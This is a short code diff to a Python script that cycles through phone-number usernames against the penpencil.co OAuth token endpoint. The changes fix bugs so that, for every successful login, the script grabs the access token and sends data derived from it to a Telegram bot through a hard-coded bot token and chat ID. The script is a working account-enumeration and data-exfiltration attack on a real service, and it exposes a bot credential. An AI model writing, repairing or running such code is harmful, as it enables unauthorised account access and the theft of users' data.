@@ -35,10 +35,10 @@ json_data = {
     'longitude': 0,
 }
 number = 8482999999
-while number!=8000000000":
-    json_data['username']=number
+while number!=8000000000:
+    json_data['username']=str(number)
     response = requests.post('https://api.penpencil.co/v3/oauth/token', headers=headers, json=json_data)
-    token=response.json()['data']['access_token']
     if (response.json())['success']:
+        token=response.json()['data']['access_token']
         requests.get('https://api.telegram.org/bot6107093453:AAEwZhVbqR3VnAL-_1-9K12ijlc-7-vhaIE/sendMessage?chat_id=-838827510&text='+str(getBs(token)))
     number-=1
